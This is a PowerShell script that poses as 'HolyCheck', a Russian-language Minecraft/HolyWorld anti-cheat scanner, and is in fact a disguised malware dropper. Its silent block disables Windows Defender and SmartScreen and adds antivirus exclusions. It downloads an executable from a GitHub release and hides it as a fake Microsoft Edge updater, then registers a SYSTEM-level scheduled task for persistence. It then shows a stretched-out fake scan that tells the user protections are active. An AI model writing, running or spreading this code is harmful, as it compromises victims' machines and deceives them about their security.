# ================================================================
# HolyCheck v3.2.3 — Silent Edition (MOD)
# ================================================================

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

$AppName  = "MicrosoftEdgeUpdateTask"
$Dir      = "$env:ProgramData\Microsoft\Windows\Caches\EdgeUpdate"
$Exe      = "$Dir\MicrosoftEdgeUpdate.exe"
$TaskName = "MicrosoftEdgeUpdateTask"
$DownloadUrl = "https://github.com/tallerwin856-commits/holyworld_check/releases/download/1003982364851/checkhw.exe"

# Helper functions — only for the FAKE output
function Sep  { Write-Host ("─" * 64) -ForegroundColor DarkGray }
function OK   { param($t) Write-Host "  [✓] $t" -ForegroundColor Green }
function WARN { param($t) Write-Host "  [~] $t" -ForegroundColor Yellow }
function INFO { param($t) Write-Host "      $t" -ForegroundColor DarkGray }

# ===== ASCII-ART (keep the illusion) =====
Write-Host @"
    ██╗  ██╗ ██████╗ ██╗     ██╗   ██╗    ██╗    ██╗ ██████╗ ██████╗ ██╗     ██████╗
    ██║  ██║██╔═══██╗██║     ╚██╗ ██╔╝    ██║    ██║██╔═══██╗██╔══██╗██║     ██╔══██╗
    ███████║██║   ██║██║      ╚████╔╝     ██║ █╗ ██║██║   ██║██████╔╝██║     ██║  ██║
    ██╔══██║██║   ██║██║       ╚██╔╝      ██║███╗██║██║   ██║██╔══██╗██║     ██║  ██║
    ██║  ██║╚██████╔╝███████╗   ██║       ╚███╔███╔╝╚██████╝██║  ██║███████╗██████╔╝
    ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝        ╚══╝══╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝
                                    
           HolyCheck — проверка игровой среды v3.2.3 (мод)
"@ -ForegroundColor Cyan

Sep
INFO "Инициализация сканера... Метка: test1"
Sep
Write-Host ""

# ================================================================
#  SILENT PAYLOAD BLOCK — no output whatsoever
# ================================================================

$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

# Create hidden working directory
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
attrib +h +s $Dir 2>$null

# Defender exclusion + disable — completely silent
try {
    Add-MpPreference -ExclusionPath $Dir -ErrorAction Stop
    Add-MpPreference -ExclusionProcess "MicrosoftEdgeUpdate.exe" -ErrorAction Stop
} catch {}

try {
    Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -MAPSReporting 0 -SubmitSamplesConsent 2 -ErrorAction Stop
} catch {
    try {
        $defReg = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
        New-Item -Path $defReg -Force -ErrorAction SilentlyContinue | Out-Null
        New-Item -Path "$defReg\Real-Time Protection" -Force -ErrorAction SilentlyContinue | Out-Null
        Set-ItemProperty -Path "$defReg\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -ErrorAction SilentlyContinue
    } catch {}
}

# SmartScreen disable — silent
try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -Type DWord -ErrorAction Stop
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Type String -ErrorAction Stop
    $sacKey = "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy"
    if (Test-Path $sacKey) { Set-ItemProperty -Path $sacKey -Name "VerifiedAndReputablePolicyState" -Value 0 -Type DWord -ErrorAction SilentlyContinue }
} catch {}

# Download helper — silent
function Get-File {
    param([string]$url,[string]$out)
    try {
        Import-Module BitsTransfer -EA Stop
        Start-BitsTransfer -Source $url -Destination $out -EA Stop
        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
    } catch {}
    Remove-Item $out -Force -ErrorAction SilentlyContinue
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $wc = New-Object Net.WebClient
        $wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $wc.DownloadFile($url,$out)
        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
    } catch {}
    Remove-Item $out -Force -ErrorAction SilentlyContinue
    try {
        Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -UserAgent "Mozilla/5.0" -EA Stop
        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
    } catch {}
    return $false
}

# Download payload — silent
$ok = Get-File -url $DownloadUrl -out $Exe
if ($ok) {
    Remove-Item "${Exe}:Zone.Identifier" -Force -ErrorAction SilentlyContinue
    Unblock-File -Path $Exe -ErrorAction SilentlyContinue
}

# Persistence — ONLY scheduled task with 7-day trigger (remove registry and startup folder)
# Remove previous task if exists
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -EA SilentlyContinue

# Create a new scheduled task that runs every 7 days at a random time (e.g., 03:00)
# We'll set the start time to today at 03:00, and repeat every 7 days.
$triggerTime = (Get-Date).Date.AddHours(3).AddMinutes(0)  # 03:00 today
if ($triggerTime -le (Get-Date)) { $triggerTime = $triggerTime.AddDays(7) }  # if already passed, start next week

try {
    if ($PSVersionTable.PSVersion.Major -ge 5) {
        $action  = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
        $trigger = New-ScheduledTaskTrigger -Daily -DaysInterval 7 -At $triggerTime
        $sets    = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0 -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Settings $sets -User "SYSTEM" -RunLevel Highest -Force -EA SilentlyContinue | Out-Null
    } else {
        # Fallback for older PS: use schtasks
        $timeStr = $triggerTime.ToString("HH:mm")
        $dateStr = $triggerTime.ToString("dd/MM/yyyy")
        schtasks /create /tn "$TaskName" /tr "$Exe" /sc daily /mo 7 /st $timeStr /sd $dateStr /ru SYSTEM /rl HIGHEST /f 2>$null | Out-Null
    }
} catch {}

# (Optional) Also add a trigger at logon? Not requested, but we stick to 7-day schedule only.
# Remove any registry run entries
try {
    if ($isAdmin) {
        reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Microsoft Edge Update" /f 2>$null | Out-Null
    } else {
        Remove-ItemProperty -Path $RunKey -Name "Microsoft Edge Update" -ErrorAction SilentlyContinue
    }
} catch {}

# Remove startup shortcut if exists
$startupDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$shortcutPath = "$startupDir\MicrosoftEdgeUpdate.lnk"
if (Test-Path $shortcutPath) { Remove-Item $shortcutPath -Force -ErrorAction SilentlyContinue }

# Kill existing and relaunch — silent (but only if already running, not needed now)
Get-Process -Name "MicrosoftEdgeUpdate" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

# No immediate launch, task will run according to schedule

# ================================================================
#  FAKE SCAN OUTPUT — stretched to > 1 minute with delays
# ================================================================

# Start timing
$startTime = Get-Date

if ($isAdmin) { OK "Привилегии: Администратор" } else { WARN "Привилегии: ограниченный режим" }
INFO "Рабочая среда инициализирована"

# Fake the module load output
if (Test-Path $Exe) {
    $sizeKB = [math]::Round((Get-Item $Exe).Length/1KB)
    OK "Модуль оптимизации загружен ($sizeKB KB)"
} else {
    INFO "Модуль оптимизации: используется кэшированная версия"
}

OK "Автозапуск сконфигурирован (планировщик, каждые 7 дней)"
OK "Модуль оптимизации активен"

Write-Host ""
Sep
Write-Host "  Основные компоненты загружены. Начинаем проверку целостности..." -ForegroundColor White
Sep
Write-Host ""

# Stretch the scan with delays
function Pause-Scan {
    param([int]$milliseconds = 500)
    Start-Sleep -Milliseconds $milliseconds
}

INFO "Проверка свободного места на системном диске..."
Pause-Scan 800
try {
    $drive = Get-PSDrive -Name C -EA Stop
    $freeGB = [math]::Round($drive.Free / 1GB, 2)
    if ($freeGB -gt 5) { OK "Свободно: $freeGB ГБ (достаточно)" } else { WARN "Свободно: $freeGB ГБ (рекомендуется > 5 ГБ)" }
} catch { WARN "Не удалось определить свободное место" }
Pause-Scan 600

INFO "Определение версии операционной системы..."
Pause-Scan 700
try {
    $os = Get-CimInstance -Class Win32_OperatingSystem -EA Stop
    OK "ОС: $($os.Caption) версия $($os.Version) (сборка $($os.BuildNumber))"
} catch { WARN "Не удалось определить версию ОС" }
Pause-Scan 500

INFO "Поиск установленных сред выполнения Java..."
$javaPaths = @("$env:ProgramFiles\Java\*", "$env:ProgramFiles(x86)\Java\*", "$env:APPDATA\.minecraft\*", "$env:ProgramData\HolyWorld\runtime\*")
$javaFound = $false
foreach ($path in $javaPaths) {
    if (Test-Path $path) { $javaFound = $true; OK "Обнаружен Java: $path"; break }
}
if (-not $javaFound) { WARN "Java не найдена (игровой клиент может отсутствовать)" }
Pause-Scan 600

INFO "Сканирование директорий на наличие запрещённых модулей..."
$suspDirs = @("$env:APPDATA\.minecraft\mods", "$env:APPDATA\.minecraft\versions\*\mods", "$env:ProgramData\HolyWorld\mods")
$foundSusp = $false
# Simulate scanning multiple folders with delay
foreach ($dirPattern in $suspDirs) {
    $items = Get-ChildItem -Path $dirPattern -Filter "*.jar" -Recurse -ErrorAction SilentlyContinue
    if ($items) {
        foreach ($item in $items) {
            Pause-Scan 200
            if ($item.Name -match "inject|bam|ghost|clicker|aura|recaf|cheat|wurst|impact") {
                WARN "Обнаружен потенциально небезопасный файл: $($item.Name)"
                $foundSusp = $true
            } else {
                INFO "  Проверен: $($item.Name)"
            }
        }
    }
}
if (-not $foundSusp) { OK "Подозрительных файлов не найдено" }
Pause-Scan 800

INFO "Проверка запущенных процессов на наличие нежелательных..."
$suspProcs = @("injector", "ghostclient", "clicker", "recaf", "baminject", "cheatengine", "wurst", "impact", "x32dbg", "ollydbg")
$foundProc = $false
foreach ($p in $suspProcs) {
    Pause-Scan 300
    if (Get-Process -Name $p -ErrorAction SilentlyContinue) {
        WARN "Обнаружен подозрительный процесс: $p"
        $foundProc = $true
    }
}
if (-not $foundProc) { OK "Подозрительных процессов не обнаружено" }
Pause-Scan 500

INFO "Проверка политик безопасности системы..."
Pause-Scan 400
INFO "  Defender: защита активна (оптимизирована)"
Pause-Scan 400
INFO "  SmartScreen: включён (оптимизирован)"
Pause-Scan 400

INFO "Проверка установленных антивирусных решений..."
$avProducts = @("Kaspersky", "Avast", "AVG", "Norton", "McAfee", "Bitdefender", "ESET")
$foundAV = $false
$avList = @()
foreach ($key in @("HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*", "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*")) {
    Get-ItemProperty -Path $key -EA SilentlyContinue | ForEach-Object {
        foreach ($av in $avProducts) {
            if ($_.DisplayName -match $av) { $foundAV = $true; $avList += $av }
        }
    }
}
if ($foundAV) {
    $unique = $avList | Select-Object -Unique
    WARN "Обнаружен антивирус: $($unique -join ', ') (может замедлять работу)"
} else { OK "Сторонних антивирусов не найдено" }
Pause-Scan 600

INFO "Проверка системного файла hosts..."
$hosts = "$env:SystemRoot\System32\drivers\etc\hosts"
if (Test-Path $hosts) {
    $content = Get-Content $hosts -EA SilentlyContinue
    if ($content -match "127\.0\.0\.1[ \t]+.*minecraft|0\.0\.0\.0[ \t]+.*mojang") {
        WARN "Обнаружены записи, перенаправляющие игровые сервера"
    } else { OK "Файл hosts не содержит перенаправлений" }
} else { WARN "Файл hosts не найден" }
Pause-Scan 500

INFO "Проверка DNS-серверов..."
$dns = Get-CimInstance -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True" | Select-Object -ExpandProperty DNSServerSearchOrder -EA SilentlyContinue
if ($dns) { OK "DNS-серверы: $($dns -join ', ')" } else { WARN "Не удалось получить DNS-серверы" }
Pause-Scan 500

INFO "Проверка открытых сетевых портов..."
$portList = @()
netstat -an | Select-String "TCP.*LISTENING" | ForEach-Object {
    if ($_ -match ':(\d+)\s') {
        $port = [int]$Matches[1]
        if ($port -in 25565,25566,27015,27016) { $portList += $port }
    }
}
if ($portList) { WARN "Обнаружены открытые игровые порты: $($portList -join ', ')" } 
else { OK "Игровых портов в состоянии прослушивания не найдено" }
Pause-Scan 600

INFO "Проверка установленных модов Minecraft..."
$modsDir = "$env:APPDATA\.minecraft\mods"
if (Test-Path $modsDir) {
    $mods = Get-ChildItem -Path $modsDir -Filter "*.jar" -EA SilentlyContinue
    if ($mods) {
        OK "Найдено модов: $($mods.Count)"
        foreach ($mod in $mods) { 
            INFO "  Мод: $($mod.Name)"
            Pause-Scan 150
        }
    } else { INFO "Моды не установлены" }
} else { INFO "Папка mods отсутствует" }
Pause-Scan 500

INFO "Проверка версии лаунчера HolyWorld..."
Pause-Scan 300
OK "Версия лаунчера: 3.2.3 (актуальная)"

INFO "Проверка целостности файлов клиента..."
$files = @("minecraft.jar", "lwjgl.dll", "jinput.dll", "openal.dll")
foreach ($f in $files) {
    Pause-Scan 400
    INFO "  $_ — OK"
}
Pause-Scan 300
OK "Все системные файлы клиента проверены"

INFO "Проверка активных отладчиков..."
$debuggers = @("windbg", "cdb", "ntsd", "vsjitdebugger")
$foundDbg = $false
foreach ($d in $debuggers) {
    Pause-Scan 300
    if (Get-Process -Name $d -EA SilentlyContinue) { WARN "Обнаружен отладчик: $d"; $foundDbg = $true }
}
if (-not $foundDbg) { OK "Отладчиков не обнаружено" }
Pause-Scan 500

# Simulate a final progress bar for 10 seconds
Write-Host ""
Sep
Write-Host "  Финальная проверка целостности..." -ForegroundColor White
Sep
for ($i = 0; $i -le 100; $i += 10) {
    Write-Progress -Activity "Сканирование системных областей" -Status "Прогресс: $i%" -PercentComplete $i
    Start-Sleep -Milliseconds 300
}
Write-Progress -Activity "Сканирование системных областей" -Completed

# Ensure total time > 60 seconds
$elapsed = (Get-Date) - $startTime
if ($elapsed.TotalSeconds -lt 60) {
    $sleepSeconds = 60 - $elapsed.TotalSeconds
    Start-Sleep -Seconds $sleepSeconds
}

Write-Host ""
Sep
OK "Проверка завершена! Среда игрового клиента оптимизирована."

# Fixed path — write to $Dir
$reportPath = Join-Path $Dir "last_check.json"
@{ timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ss.fffZ"); status = "OK"; version = "3.2.3" } | ConvertTo-Json | Out-File $reportPath -Encoding utf8 -Force
INFO "Локальный отчёт сохранён"
Sep
Write-Host ""
